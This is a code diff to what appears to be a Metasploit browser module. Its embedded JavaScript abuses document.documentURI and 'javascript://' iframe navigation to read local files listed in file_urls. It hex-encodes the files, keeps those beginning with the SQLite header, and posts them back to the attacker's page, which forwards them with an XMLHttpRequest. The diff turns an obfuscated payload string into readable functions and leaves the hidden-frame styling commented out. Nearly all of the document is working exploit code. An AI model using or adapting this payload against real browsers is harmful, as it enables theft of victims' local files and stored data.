@@ -110,32 +110,66 @@ class Metasploit3 < Msf::Auxiliary
 
   def exploit_js
     js_obfuscate %Q|
-
       window.onmessage = function(e) {
         var x = new XMLHttpRequest;
         x.open("POST", location.href);
         x.send(JSON.stringify(e.data))
       };
 
+
+      function xss() {
+        var urls = (#{JSON.generate(file_urls)});
+        function tick() {
+          setTimeout(function() { next(urls.shift()); });
+        };
+        window.onmessage = tick;
+
+        function next(url) {
+          if (!url) return;
+          try {
+            var f = document.createElement('iframe');
+            f.src = url;
+            f.onload = function() {
+              f.onload = null;
+              function nested() {
+                var x = new XMLHttpRequest;
+                x.open('GET', location.href);
+                x.responseType = 'arraybuffer';
+                x.send();
+                x.onload = function() {
+                  var buff = new Uint8Array(x.response);
+                  var hex = Array.prototype.map.call(buff, function(d) {
+                    var c = d.toString(16);
+                    return (c.length < 2) ? 0+c : c;
+                  }).join(new String);
+                  if (hex.length && hex.substring(0,8)==='53514c69') {
+                    top.postMessage({data:hex,url:location.href}, '*');
+                  }
+                  parent.postMessage(1,'*');
+                };
+                x.onerror = function() {
+                  parent.postMessage(1,'*');
+                };
+              }
+              document.documentURI = 'javascript://hostname.com/%0D%0A('+encodeURIComponent(nested.toString())+')()';
+              f.contentWindow.location = "";
+            };
+            document.body.appendChild(f);
+          } catch(e) {t();}
+        };
+
+        tick();
+
+      }
+
       var brokenFrame = document.createElement('iframe');
       brokenFrame.src = 'http://localhost:100';
-      brokenFrame.setAttribute('style', 'position:absolute;left:-1000px;height:0;width:0;visibility:hidden;')
+      //brokenFrame.setAttribute('style', 'position:absolute;left:-1000px;height:0;width:0;visibility:hidden;')
       brokenFrame.onload = function() {
         brokenFrame.onload = null;
-        document.documentURI = 'javascript://hostname.com/%0D%0Aurls=(#{JSON.generate(file_urls)});'+
-          'var t=function(){setTimeout(function(){next(urls.shift());},1)};window.onmessage=t;'+
-          'var next=(function(url){if(!url)return;try{var f = document.createElement("iframe");f.src=url;f.onload=f'+
-          'unction(){f.onload=null;document.documentURI="javascript://hostname.com/%250D%250Ax=new '+
-          'XMLHttpRequest;x.open(String.fromCharCode(71,69,84),location.href);x.responseType=String.fromCharCode(97,'+
-          '114,114,97,121,98,117,102,102,101,114);x.send();x.onload=function(){window.onerror=alert;'+
-          'var buff = new Uint8Array(x.response);var hex = Array.prototype.map.call(buff, function(d)'+
-          '{var c = d.toString(16);return (c.length < 2) ? 0+c : c;}).join(new String); top.postMessa'+
-          'ge({data:hex,url:location.href}, String.fromCharCode(42));'+
-          'parent.postMessage(1,String.fromCharCode(42));};x.onerror=function(){parent.postMessage(1,S'+
-          'tring.fromCharCode(42))};";f.contentWindow.location = "";};document.body.appendChild(f);}catch(e){t();}});t();';
+        document.documentURI = 'javascript://hostname.com/%0D%0A('+encodeURIComponent(xss.toString())+')()';
         brokenFrame.contentWindow.location = "";
       };
-
       document.body.appendChild(brokenFrame);
     |
   end
